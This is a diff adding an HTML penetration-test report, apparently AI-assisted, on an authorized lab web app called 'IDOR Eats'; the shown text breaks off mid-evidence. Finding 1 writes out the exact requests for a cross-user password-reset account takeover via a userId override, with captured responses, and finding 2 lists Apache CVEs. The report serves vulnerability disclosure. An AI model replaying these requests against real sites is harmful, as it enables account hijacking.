@@ -1,0 +1,1314 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>VERDICT Report a-mqyrkert-3ebezp</title><style>
+*{box-sizing:border-box}
+body{font:14px/1.5 -apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;color:#1a1a1a;margin:0;padding:32px;background:#fff}
+h1{font-size:22px;margin:0 0 4px} h2{font-size:17px;margin:28px 0 10px;border-bottom:2px solid #eee;padding-bottom:4px}
+h3{font-size:15px;margin:18px 0 6px}
+code,pre{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+pre{background:#f6f8fa;border:1px solid #e3e6ea;border-radius:6px;padding:10px;overflow:auto;font-size:12.5px;white-space:pre-wrap;word-break:break-word}
+.meta{color:#555;font-size:13px;margin:0 0 2px}
+.badge{display:inline-block;color:#fff;border-radius:4px;padding:1px 8px;font-size:12px;font-weight:700;letter-spacing:.3px}
+.sumtags span{display:inline-block;margin:0 6px 6px 0;padding:2px 10px;border-radius:12px;background:#eef1f4;font-size:12px}
+.f{border:1px solid #e3e6ea;border-radius:8px;padding:14px 16px;margin:0 0 14px}
+.f .kv{color:#555;font-size:12.5px;margin:2px 0}
+.f .desc{margin:8px 0}
+table{border-collapse:collapse;width:100%;font-size:13px}
+th,td{border:1px solid #e3e6ea;padding:6px 8px;text-align:left;vertical-align:top}
+th{background:#f6f8fa}
+table.info td:first-child{width:170px;color:#555;font-weight:600;background:#fafbfc}
+.muted{color:#888}
+img.shot{max-width:220px;max-height:140px;border:1px solid #ddd;border-radius:4px}
+.ev{margin:10px 0 0;border-left:3px solid #cdd5dd;padding-left:10px}
+.ev .evh{font-size:12px;color:#555;margin:0 0 4px}
+.ev .lbl{font-size:11px;font-weight:700;letter-spacing:.4px;color:#5f7d8c;margin:6px 0 2px}
+.ev pre{margin:0;max-height:420px}
+html{scroll-behavior:smooth}
+.toc{background:#fafbfc;border:1px solid #e3e6ea;border-radius:8px;padding:10px 16px;margin:14px 0 8px}
+.toc .toctitle{font-weight:700;font-size:12px;color:#555;letter-spacing:.4px;text-transform:uppercase;margin:0 0 6px}
+.toc ul{margin:0;padding-left:18px} .toc>ul{padding-left:16px;list-style:none}
+.toc li{margin:2px 0;font-size:13px} .toc a{color:#0366d6;text-decoration:none} .toc a:hover{text-decoration:underline}
+.toc .sev{font-weight:700;font-size:11px;letter-spacing:.3px}
+@media print{body{padding:0}.f{break-inside:avoid}.ev pre{max-height:none}.toc{break-inside:avoid}}
+</style></head>
+<body>
+<h1>VERDICT Security Assessment Report</h1>
+<nav class="toc"><div class="toctitle">Contents</div><ul>
+<li><a href="#assessment-information">Assessment Information</a></li>
+<li><a href="#scope">Scope</a></li>
+<li><a href="#summary">Summary</a></li>
+<li><a href="#findings">Findings</a><ul>
+<li><a href="#finding-1">1. <span class="sev" style="color:#b00020">CRITICAL</span> [idor-write] Account takeover via userId override in change_password.php (IDOR-write / mass-assignment)</a></li>
+<li><a href="#finding-2">2. <span class="sev" style="color:#d32f2f">HIGH</span> [vulnerable-component] Outdated Apache httpd 2.4.41 (Ubuntu) — multiple known high/critical CVEs (CVE-2021-40438, CVE-2023-25690, CVE-2021-44790)</a></li>
+<li><a href="#finding-3">3. <span class="sev" style="color:#f57c00">MEDIUM</span> [idor] IDOR: any authenticated user can read any user's favorite restaurants and username via userId</a></li>
+<li><a href="#finding-4">4. <span class="sev" style="color:#c9a227">LOW</span> [info-disclosure] Directory listing enabled on /api/ exposes backend source filenames</a></li>
+</ul></li>
+</ul></nav>
+<h2 id="assessment-information">Assessment Information</h2><table class="info">
+<tr><td>Assessment ID</td><td><code>a-mqyrkert-3ebezp</code></td></tr>
+<tr><td>Target</td><td><code>http://target.local:32852/</code></td></tr>
+<tr><td>Started</td><td>2026-06-29T05:15:02.974Z</td></tr>
+<tr><td>Generated</td><td>2026-07-02T00:00:00.000Z</td></tr>
+<tr><td>Phase</td><td>report</td></tr>
+<tr><td>Screens</td><td>11 mapped · 11 scanned · 0 remaining</td></tr>
+<tr><td>Hypotheses</td><td>0 (0 confirmed)</td></tr>
+<tr><td>Findings</td><td>4</td></tr>
+<tr><td>Tooling</td><td>VERDICT</td></tr>
+</table>
+<h2 id="scope">Scope</h2><table class="info">
+<tr><td>In-scope hosts</td><td><code>target.local:32852</code></td></tr>
+<tr><td>Out-of-scope hosts</td><td>&mdash;</td></tr>
+<tr><td>In-scope paths</td><td><code>/</code></td></tr>
+<tr><td>Out-of-scope paths</td><td>&mdash;</td></tr>
+<tr><td>Rate</td><td>30 req/min, max 2 concurrent</td></tr>
+</table>
+<h2 id="summary">Summary</h2>
+<p>4 finding(s)</p><p class="sumtags"><span><b style="color:#b00020">1</b> critical</span><span><b style="color:#d32f2f">1</b> high</span><span><b style="color:#f57c00">1</b> medium</span><span><b style="color:#c9a227">1</b> low</span></p>
+<h2 id="findings">Findings</h2>
+<div class="f" id="finding-1">
+<h3><span class="badge" style="background:#b00020">CRITICAL</span> 1. [idor-write] Account takeover via userId override in change_password.php (IDOR-write / mass-assignment)</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32852/</div>
+<div class="desc">/api/change_password.php is meant to change the *session* user's password (the legitimate profile form posts only oldPassword/newPassword/confirmPassword). Instead, the endpoint trusts a client-supplied `userId` body parameter and applies the password change to THAT account rather than the authenticated session user. Any authenticated low-privilege user can therefore set an arbitrary new password on ANY account = full cross-user account takeover. The `oldPassword` is validated only against the ATTACKER's own session credentials (not the target's), so no knowledge of the victim's password is required; the victim is chosen purely via `userId`. No ownership/existence check is performed (even userId=999999 returns &quot;Password changed successfully&quot;). Victim userIds/usernames are trivially enumerable and are additionally leaked by the IDOR in get_favorite_restaurants.php (userId=1 = privileged user &quot;not_that_easy&quot;). Demonstrated by hijacking userId=1 (&quot;not_that_easy&quot;) from an unrelated, freshly-registered attacker account and then using that account's authenticated session.</div>
+<div><b>Reproduction</b></div><pre>SETUP: Register+login a normal user attacker_verdict/AttackPass123!, capture its PHPSESSID (attacker session).
+EXPLOIT — rewrite the victim's password (ev-mqytmuwz-5i, repeated ev-mqythg8i-5d): POST /api/change_password.php with the ATTACKER cookie and body `userId=1&amp;oldPassword=AttackPass123!&amp;newPassword=VerdictPwn7777!&amp;confirmPassword=VerdictPwn7777!` → {&quot;success&quot;:true,&quot;message&quot;:&quot;Password changed successfully.&quot;}. oldPassword is the attacker's own, not the victim's.
+TAKE OVER THE SESSION: POST /api/login.php `username=not_that_easy&amp;password=VerdictPwn7777!` → {&quot;success&quot;:true,&quot;message&quot;:&quot;Login successful.&quot;} (the attacker-chosen password now authenticates the victim; session cookie 7kk55p2drei0apr6a7rba6mgc9).
+PROOF (authenticated access as the victim):
+- NEGATIVE CONTROL (ev-mqytorx8-5o): GET /profile.php with NO session → HTTP 302 redirect to login.php (1-byte body) — without the hijacked session there is no access.
+- POSITIVE REPLAYS (ev-mqytp4s9-5p, ev-mqytp5l6-5q): GET /profile.php with the hijacked victim session → HTTP 200, full 8707-byte &quot;User Profile | IDOR Eats&quot; page for not_that_easy, on both replays.
+Also confirmed: after the override the attacker's own account still authenticated with its ORIGINAL password (AttackPass123!), proving the write hit userId=1, not the session user.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqytorx8-5o</code> — <code>artifacts/_/ev-mqytorx8-5o/</code></div><div class="lbl">REQUEST</div><pre>GET /profile.php HTTP/1.1
+Host: target.local:32852
+user-agent: verdict-scanner/0.1
+x-verdict: assessment</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 302
+cache-control: no-store, no-cache, must-revalidate
+connection: Keep-Alive
+content-length: 1
+content-type: text/html; charset=UTF-8
+date: Mon, 29 Jun 2026 06:14:25 GMT
+expires: Thu, 19 Nov 1981 08:52:00 GMT
+keep-alive: timeout=5, max=100
+location: login.php
+pragma: no-cache
+server: Apache/2.4.41 (Ubuntu)
+set-cookie: &lt;redacted&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqytp4s9-5p</code> — <code>artifacts/_/ev-mqytp4s9-5p/</code></div><div class="lbl">REQUEST</div><pre>GET /profile.php HTTP/1.1
+Host: target.local:32852
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+Cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+cache-control: no-store, no-cache, must-revalidate
+connection: Keep-Alive
+content-length: 8707
+content-type: text/html; charset=UTF-8
+date: Mon, 29 Jun 2026 06:14:42 GMT
+expires: Thu, 19 Nov 1981 08:52:00 GMT
+keep-alive: timeout=5, max=100
+pragma: no-cache
+server: Apache/2.4.41 (Ubuntu)
+vary: Accept-Encoding
+
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;title&gt;User Profile | IDOR Eats&lt;/title&gt;
+    &lt;link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+    &lt;style&gt;
+        body {
+            background-color: #f8f9fa;
+        }
+        .navbar {
+            background-color: #000;
+            margin-bottom: 20px;
+        }
+        .navbar-brand, .nav-link {
+            color: #fff !important;
+        }
+        .nav-link:hover {
+            color: #76c043 !important;
+        }
+        .navbar-toggler-icon {
+            background-color: #fff;
+        }
+        .profile-header {
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        .profile-header img {
+            border-radius: 50%;
+            width: 150px;
+            height: 150px;
+        }
+        .favorite-restaurant {
+            display: flex;
+            align-items: center;
+            background-color: #fff;
+            border-radius: 5px;
+            padding: 10px;
+            margin-bottom: 10px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+        }
+        .favorite-restaurant img {
+            width: 50px;
+            height: 50px;
+            margin-right: 10px;
+        }
+        .btn-primary {
+            background-color: #76c043;
+            border: none;
+        }
+        .btn-primary:hover {
+            background-color: #5a9b36;
+        }
+        .profile-header {
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        .profile-header img {
+            border-radius: 50%;
+            width: 150px;
+            height: 150px;
+            object-fit: cover;
+            margin-bottom: 15px;
+            border: 5px solid #fff;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);
+        }
+        footer {
+            background-color: #000;
+            color: #fff;
+            padding: 20px 0;
+        }
+        footer a {
+            color: #76c043;
+        }
+        footer a:hover {
+            color: #5a9b36;
+        }
+    &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;nav class=&quot;navbar navbar-expand-lg&quot;&gt;
+        &lt;div class=&quot;container-fluid&quot;&gt;
+            &lt;a class=&quot;navbar-brand&quot; href=&quot;#&quot;&gt;IDOR Eats&lt;/a&gt;
+            &lt;button class=&quot;navbar-toggler&quot; type=&quot;button&quot; data-bs-toggle=&quot;collapse&quot; data-bs-target=&quot;#navbarNav&quot; aria-controls=&quot;navbarNav&quot; aria-expanded=&quot;false&quot; aria-label=&quot;Toggle navigation&quot;&gt;
+                &lt;span class=&quot;navbar-toggler-icon&quot;&gt;&lt;/span&gt;
+            &lt;/button&gt;
+            &lt;div class=&quot;collapse navbar-collapse&quot; id=&quot;navbarNav&quot;&gt;
+                &lt;ul class=&quot;navbar-nav ms-auto&quot;&gt;
+                    &lt;li class=&quot;nav-item&quot;&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;profile.php&quot;&gt;Profile&lt;/a&gt;
+                    &lt;/li&gt;
+                    &lt;li class=&quot;nav-item&quot;&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;logout.php&quot;&gt;Logout&lt;/a&gt;
+                    &lt;/li&gt;
+                &lt;/ul&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/nav&gt;
+
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;div class=&quot;profile-header&quot;&gt;
+            &lt;img src=&quot;static/images/profile.jpg&quot; class=&quot;img-fluid rounded-circle&quot;&gt;
+            &lt;h1&gt;not_that_easy&lt;/h1&gt;
+            &lt;p&gt;not_that_easy@idoreats.local&lt;/p&gt;
+            &lt;button class=&quot;btn btn-primary&quot; data-bs-toggle=&quot;modal&quot; data-bs-target=&quot;#changePasswordModal&quot;&gt;Change Password&lt;/button&gt;
+                    &lt;/div&gt;
+
+        &lt;h2 class=&quot;mt-4&quot;&gt;Favorite Restaurants&lt;/h2&gt;
+        &lt;ul id=&quot;favoriteRestaurants&quot; class=&quot;list-group&quot;&gt;
+            &lt;!-- Favorite restaurants will be loaded here --&gt;
+        &lt;/ul&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Change Password Modal --&gt;
+        &lt;div class=&quot;modal fade&quot; id=&quot;changePasswordModal&quot; tabindex=&quot;-1&quot; aria-labelledby=&quot;changePasswordModalLabel&quot; aria-hidden=&quot;true&quot;&gt;
+        &lt;div class=&quot;modal-dialog&quot;&gt;
+            &lt;div class=&quot;modal-content&quot;&gt;
+                &lt;div class=&quot;modal-header&quot;&gt;
+                    &lt;h5 class=&quot;modal-title&quot; id=&quot;changePasswordModalLabel&quot;&gt;Change Password&lt;/h5&gt;
+                    &lt;button type=&quot;button&quot; class=&quot;btn-close&quot; data-bs-dismiss=&quot;modal&quot; aria-label=&quot;Close&quot;&gt;&lt;/button&gt;
+                &lt;/div&gt;
+                &lt;div class=&quot;modal-body&quot;&gt;
+                    &lt;form id=&quot;changePasswordForm&quot;&gt;
+                        &lt;div class=&quot;mb-3&quot;&gt;
+                            &lt;label for=&quot;oldPassword&quot; class=&quot;form-label&quot;&gt;Old Password&lt;/label&gt;
+                            &lt;input type=&quot;password&quot; class=&quot;form-control&quot; id=&quot;oldPassword&quot; name=&quot;oldPassword&quot; required&gt;
+                        &lt;/div&gt;
+                        &lt;div class=&quot;mb-3&quot;&gt;
+                            &lt;label for=&quot;newPassword&quot; class=&quot;form-label&quot;&gt;New Password&lt;/label&gt;
+                            &lt;input type=&quot;password&quot; class=&quot;form-control&quot; id=&quot;newPassword&quot; name=&quot;newPassword&quot; required&gt;
+                        &lt;/div&gt;
+                        &lt;div class=&quot;mb-3&quot;&gt;
+                            &lt;label for=&quot;confirmPassword&quot; class=&quot;form-label&quot;&gt;Confirm New Password&lt;/label&gt;
+                            &lt;input type=&quot;password&quot; class=&quot;form-control&quot; id=&quot;confirmPassword&quot; name=&quot;confirmPassword&quot; required&gt;
+                        &lt;/div&gt;
+                        &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;Change Password&lt;/button&gt;
+                        &lt;div id=&quot;passwordChangeMessage&quot; class=&quot;mt-3&quot;&gt;&lt;/div&gt;
+                    &lt;/form&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+    &lt;footer class=&quot;text-center&quot;&gt;
+        &lt;div class=&quot;container&quot;&gt;
+            &lt;p&gt;&amp;copy; 2024 IDOR Eats. All rights reserved.&lt;/p&gt;
+        &lt;/div&gt;
+    &lt;/footer&gt;
+    &lt;script src=&quot;https://code.jquery.com/jquery-3.6.0.min.js&quot;&gt;&lt;/script&gt;
+    &lt;script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;
+    &lt;script&gt;
+        $(document).ready(function() {
+            // Fetch favorite restaurants
+            $.ajax({
+                url: 'api/get_favorite_restaurants.php?userId=1',
+                type: 'GET',
+                success: function(response) {
+                    if (response.success) {
+                        var restaurants = response.data.restaurants;
+                        var list = $('#favoriteRestaurants');
+                        var imageIndex = 1; // Start with the first image
+                        restaurants.forEach(function(restaurant) {
+                            var imageSrc = 'static/images/restaurant' + imageIndex + '.jpg';
+                            list.append(
+                                '&lt;li class=&quot;list-group-item favorite-restaurant&quot;&gt;' +
+                                '&lt;img src=&quot;' + imageSrc + '&quot; style=&quot;height: 50px; width: 50px; margin-right: 10px;&quot; alt=&quot;' + restaurant + '&quot;&gt;' +
+                                restaurant + 
+                                '&lt;/li&gt;'
+                            );
+                            // Update the image index, cycle back to 1 if it exceeds the number of images
+                            imageIndex = (imageIndex % 10) + 1;
+                        });
+                    } else {
+                        $('#favoriteRestaurants').html('&lt;li class=&quot;list-group-item text-danger&quot;&gt;Error fetching favorite restaurants.&lt;/li&gt;');
+                    }
+                },
+                error: function() {
+                    $('#favoriteRestaurants').html('&lt;li class=&quot;list-group-item text-danger&quot;&gt;An error occurred. Please try again.&lt;/li&gt;');
+                }
+            });
+
+
+            // Handle change password form submission
+            $('#changePasswordForm').on('submit', function(event) {
+                event.preventDefault();
+                
+                $.ajax({
+                    url: 'api/change_password.php',
+                    type: 'POST',
+                    data: {
+                        oldPassword: $('#oldPassword').val(),
+                        newPassword: $('#newPassword').val(),
+                        confirmPassword: $('#confirmPassword').val(),
+                        userId: 1                    },
+                    success: function(response) {
+                        var message = $('#passwordChangeMessage');
+                        if (response.success) {
+                            message.text('Password changed successfully.').removeClass('text-danger').addClass('text-success');
+                            $('#changePasswordForm')[0].reset();
+                        } else {
+                            message.text(response.message).removeClass('text-success').addClass('text-danger');
+                        }
+                    },
+                    error: function() {
+                        $('#passwordChangeMessage').text('An error occurred. Please try again.').removeClass('text-success').addClass('text-danger');
+                    }
+                });
+            });
+        });
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqytp5l6-5q</code> — <code>artifacts/_/ev-mqytp5l6-5q/</code></div><div class="lbl">REQUEST</div><pre>GET /profile.php HTTP/1.1
+Host: target.local:32852
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+Cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+cache-control: no-store, no-cache, must-revalidate
+connection: Keep-Alive
+content-length: 8707
+content-type: text/html; charset=UTF-8
+date: Mon, 29 Jun 2026 06:14:43 GMT
+expires: Thu, 19 Nov 1981 08:52:00 GMT
+keep-alive: timeout=5, max=99
+pragma: no-cache
+server: Apache/2.4.41 (Ubuntu)
+vary: Accept-Encoding
+
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;title&gt;User Profile | IDOR Eats&lt;/title&gt;
+    &lt;link href=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+    &lt;style&gt;
+        body {
+            background-color: #f8f9fa;
+        }
+        .navbar {
+            background-color: #000;
+            margin-bottom: 20px;
+        }
+        .navbar-brand, .nav-link {
+            color: #fff !important;
+        }
+        .nav-link:hover {
+            color: #76c043 !important;
+        }
+        .navbar-toggler-icon {
+            background-color: #fff;
+        }
+        .profile-header {
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        .profile-header img {
+            border-radius: 50%;
+            width: 150px;
+            height: 150px;
+        }
+        .favorite-restaurant {
+            display: flex;
+            align-items: center;
+            background-color: #fff;
+            border-radius: 5px;
+            padding: 10px;
+            margin-bottom: 10px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.1);
+        }
+        .favorite-restaurant img {
+            width: 50px;
+            height: 50px;
+            margin-right: 10px;
+        }
+        .btn-primary {
+            background-color: #76c043;
+            border: none;
+        }
+        .btn-primary:hover {
+            background-color: #5a9b36;
+        }
+        .profile-header {
+            margin-bottom: 20px;
+            text-align: center;
+        }
+        .profile-header img {
+            border-radius: 50%;
+            width: 150px;
+            height: 150px;
+            object-fit: cover;
+            margin-bottom: 15px;
+            border: 5px solid #fff;
+            box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);
+        }
+        footer {
+            background-color: #000;
+            color: #fff;
+            padding: 20px 0;
+        }
+        footer a {
+            color: #76c043;
+        }
+        footer a:hover {
+            color: #5a9b36;
+        }
+    &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;nav class=&quot;navbar navbar-expand-lg&quot;&gt;
+        &lt;div class=&quot;container-fluid&quot;&gt;
+            &lt;a class=&quot;navbar-brand&quot; href=&quot;#&quot;&gt;IDOR Eats&lt;/a&gt;
+            &lt;button class=&quot;navbar-toggler&quot; type=&quot;button&quot; data-bs-toggle=&quot;collapse&quot; data-bs-target=&quot;#navbarNav&quot; aria-controls=&quot;navbarNav&quot; aria-expanded=&quot;false&quot; aria-label=&quot;Toggle navigation&quot;&gt;
+                &lt;span class=&quot;navbar-toggler-icon&quot;&gt;&lt;/span&gt;
+            &lt;/button&gt;
+            &lt;div class=&quot;collapse navbar-collapse&quot; id=&quot;navbarNav&quot;&gt;
+                &lt;ul class=&quot;navbar-nav ms-auto&quot;&gt;
+                    &lt;li class=&quot;nav-item&quot;&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;profile.php&quot;&gt;Profile&lt;/a&gt;
+                    &lt;/li&gt;
+                    &lt;li class=&quot;nav-item&quot;&gt;
+                        &lt;a class=&quot;nav-link&quot; href=&quot;logout.php&quot;&gt;Logout&lt;/a&gt;
+                    &lt;/li&gt;
+                &lt;/ul&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/nav&gt;
+
+    &lt;div class=&quot;container&quot;&gt;
+        &lt;div class=&quot;profile-header&quot;&gt;
+            &lt;img src=&quot;static/images/profile.jpg&quot; class=&quot;img-fluid rounded-circle&quot;&gt;
+            &lt;h1&gt;not_that_easy&lt;/h1&gt;
+            &lt;p&gt;not_that_easy@idoreats.local&lt;/p&gt;
+            &lt;button class=&quot;btn btn-primary&quot; data-bs-toggle=&quot;modal&quot; data-bs-target=&quot;#changePasswordModal&quot;&gt;Change Password&lt;/button&gt;
+                    &lt;/div&gt;
+
+        &lt;h2 class=&quot;mt-4&quot;&gt;Favorite Restaurants&lt;/h2&gt;
+        &lt;ul id=&quot;favoriteRestaurants&quot; class=&quot;list-group&quot;&gt;
+            &lt;!-- Favorite restaurants will be loaded here --&gt;
+        &lt;/ul&gt;
+    &lt;/div&gt;
+
+    &lt;!-- Change Password Modal --&gt;
+        &lt;div class=&quot;modal fade&quot; id=&quot;changePasswordModal&quot; tabindex=&quot;-1&quot; aria-labelledby=&quot;changePasswordModalLabel&quot; aria-hidden=&quot;true&quot;&gt;
+        &lt;div class=&quot;modal-dialog&quot;&gt;
+            &lt;div class=&quot;modal-content&quot;&gt;
+                &lt;div class=&quot;modal-header&quot;&gt;
+                    &lt;h5 class=&quot;modal-title&quot; id=&quot;changePasswordModalLabel&quot;&gt;Change Password&lt;/h5&gt;
+                    &lt;button type=&quot;button&quot; class=&quot;btn-close&quot; data-bs-dismiss=&quot;modal&quot; aria-label=&quot;Close&quot;&gt;&lt;/button&gt;
+                &lt;/div&gt;
+                &lt;div class=&quot;modal-body&quot;&gt;
+                    &lt;form id=&quot;changePasswordForm&quot;&gt;
+                        &lt;div class=&quot;mb-3&quot;&gt;
+                            &lt;label for=&quot;oldPassword&quot; class=&quot;form-label&quot;&gt;Old Password&lt;/label&gt;
+                            &lt;input type=&quot;password&quot; class=&quot;form-control&quot; id=&quot;oldPassword&quot; name=&quot;oldPassword&quot; required&gt;
+                        &lt;/div&gt;
+                        &lt;div class=&quot;mb-3&quot;&gt;
+                            &lt;label for=&quot;newPassword&quot; class=&quot;form-label&quot;&gt;New Password&lt;/label&gt;
+                            &lt;input type=&quot;password&quot; class=&quot;form-control&quot; id=&quot;newPassword&quot; name=&quot;newPassword&quot; required&gt;
+                        &lt;/div&gt;
+                        &lt;div class=&quot;mb-3&quot;&gt;
+                            &lt;label for=&quot;confirmPassword&quot; class=&quot;form-label&quot;&gt;Confirm New Password&lt;/label&gt;
+                            &lt;input type=&quot;password&quot; class=&quot;form-control&quot; id=&quot;confirmPassword&quot; name=&quot;confirmPassword&quot; required&gt;
+                        &lt;/div&gt;
+                        &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;Change Password&lt;/button&gt;
+                        &lt;div id=&quot;passwordChangeMessage&quot; class=&quot;mt-3&quot;&gt;&lt;/div&gt;
+                    &lt;/form&gt;
+                &lt;/div&gt;
+            &lt;/div&gt;
+        &lt;/div&gt;
+    &lt;/div&gt;
+    &lt;footer class=&quot;text-center&quot;&gt;
+        &lt;div class=&quot;container&quot;&gt;
+            &lt;p&gt;&amp;copy; 2024 IDOR Eats. All rights reserved.&lt;/p&gt;
+        &lt;/div&gt;
+    &lt;/footer&gt;
+    &lt;script src=&quot;https://code.jquery.com/jquery-3.6.0.min.js&quot;&gt;&lt;/script&gt;
+    &lt;script src=&quot;https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js&quot;&gt;&lt;/script&gt;
+    &lt;script&gt;
+        $(document).ready(function() {
+            // Fetch favorite restaurants
+            $.ajax({
+                url: 'api/get_favorite_restaurants.php?userId=1',
+                type: 'GET',
+                success: function(response) {
+                    if (response.success) {
+                        var restaurants = response.data.restaurants;
+                        var list = $('#favoriteRestaurants');
+                        var imageIndex = 1; // Start with the first image
+                        restaurants.forEach(function(restaurant) {
+                            var imageSrc = 'static/images/restaurant' + imageIndex + '.jpg';
+                            list.append(
+                                '&lt;li class=&quot;list-group-item favorite-restaurant&quot;&gt;' +
+                                '&lt;img src=&quot;' + imageSrc + '&quot; style=&quot;height: 50px; width: 50px; margin-right: 10px;&quot; alt=&quot;' + restaurant + '&quot;&gt;' +
+                                restaurant + 
+                                '&lt;/li&gt;'
+                            );
+                            // Update the image index, cycle back to 1 if it exceeds the number of images
+                            imageIndex = (imageIndex % 10) + 1;
+                        });
+                    } else {
+                        $('#favoriteRestaurants').html('&lt;li class=&quot;list-group-item text-danger&quot;&gt;Error fetching favorite restaurants.&lt;/li&gt;');
+                    }
+                },
+                error: function() {
+                    $('#favoriteRestaurants').html('&lt;li class=&quot;list-group-item text-danger&quot;&gt;An error occurred. Please try again.&lt;/li&gt;');
+                }
+            });
+
+
+            // Handle change password form submission
+            $('#changePasswordForm').on('submit', function(event) {
+                event.preventDefault();
+                
+                $.ajax({
+                    url: 'api/change_password.php',
+                    type: 'POST',
+                    data: {
+                        oldPassword: $('#oldPassword').val(),
+                        newPassword: $('#newPassword').val(),
+                        confirmPassword: $('#confirmPassword').val(),
+                        userId: 1                    },
+                    success: function(response) {
+                        var message = $('#passwordChangeMessage');
+                        if (response.success) {
+                            message.text('Password changed successfully.').removeClass('text-danger').addClass('text-success');
+                            $('#changePasswordForm')[0].reset();
+                        } else {
+                            message.text(response.message).removeClass('text-success').addClass('text-danger');
+                        }
+                    },
+                    error: function() {
+                        $('#passwordChangeMessage').text('An error occurred. Please try again.').removeClass('text-success').addClass('text-danger');
+                    }
+                });
+            });
+        });
+    &lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-2">
+<h3><span class="badge" style="background:#d32f2f">HIGH</span> 2. [vulnerable-component] Outdated Apache httpd 2.4.41 (Ubuntu) — multiple known high/critical CVEs (CVE-2021-40438, CVE-2023-25690, CVE-2021-44790)</h3>
+<div class="kv">Screen: <code>(cross-screen)</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32852/</div>
+<div class="desc">The server runs Apache httpd 2.4.41 (released 2019-08-14), disclosed verbatim in the `Server: Apache/2.4.41 (Ubuntu)` response header (and echoed in the default 404 `&lt;address&gt;` banner). This release is ~5 years out of date and is affected by numerous CVEs fixed in later 2.4.x versions, several high/critical. Notable issues that apply to 2.4.41:
+- CVE-2021-40438 (CVSS 9.0) — mod_proxy SSRF via crafted request URI (fixed 2.4.49).
+- CVE-2023-25690 (CVSS 9.8) — HTTP request smuggling via mod_proxy + mod_rewrite RewriteRule/ProxyPassMatch (fixed 2.4.56).
+- CVE-2022-22720 (CVSS 9.8) — HTTP request smuggling / inconsistent interpretation (fixed 2.4.53).
+- CVE-2021-44790 (CVSS 9.8) — mod_lua multipart parser buffer overflow, potential RCE (fixed 2.4.52).
+- CVE-2021-39275 (CVSS 9.8) — ap_escape_quotes buffer overflow (fixed 2.4.49).
+- CVE-2020-11984 (CVSS 9.8) — mod_proxy_uwsgi info-disclosure/RCE; 2.4.41 is in the affected range (fixed 2.4.46).
+
+This is a VERSION-BASED finding: it was matched from the Server banner, NOT exploited. Most of the critical CVEs above are module-dependent (mod_proxy, mod_lua, mod_proxy_uwsgi, mod_rewrite); their real exploitability depends on which modules/config this instance actually loads, which was not enumerated. The operator should confirm loaded modules and config before relying on any single CVE. Regardless of module status, the version is EOL-relative-to-patches and discloses itself, so it should be upgraded to a current 2.4.x and have ServerTokens reduced.</div>
+<div><b>Reproduction</b></div><pre>1. GET http://target.local:32852/ → response includes `Server: Apache/2.4.41 (Ubuntu)` (200, body ~11265 bytes) [positives ev-mqytsagd-5y, ev-mqyttizs-5z].
+2. GET http://target.local:32852/nonexistent-xyz-banner-404 → 404 (279 bytes) whose body `&lt;address&gt;` line also reads `Apache/2.4.41 (Ubuntu) Server at target.local Port 32852` [control ev-mqyttjjz-60], independently confirming the version.
+3. Cross-reference 2.4.41 against the Apache httpd security advisories / NVD for the CVEs listed above.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mqyttjjz-60</code> — <code>artifacts/_/ev-mqyttjjz-60/</code></div><div class="lbl">REQUEST</div><pre>GET /nonexistent-xyz-banner-404 HTTP/1.1
+Host: target.local:32852
+user-agent: verdict-scanner/0.1
